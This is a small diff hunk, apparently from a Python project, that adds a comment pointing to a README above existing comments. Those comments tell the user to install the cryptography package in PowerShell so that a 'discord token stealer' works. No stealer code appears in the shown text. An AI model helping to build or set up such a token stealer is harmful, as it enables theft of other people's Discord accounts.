@@ -1,3 +1,5 @@
+# PLEASE READ README.md, it will tell you how it works
+
 # GO TO POWERSHELL AND DOWNLOAD THIS
 # pip install cryptography
 # for the discord token stealer to work!
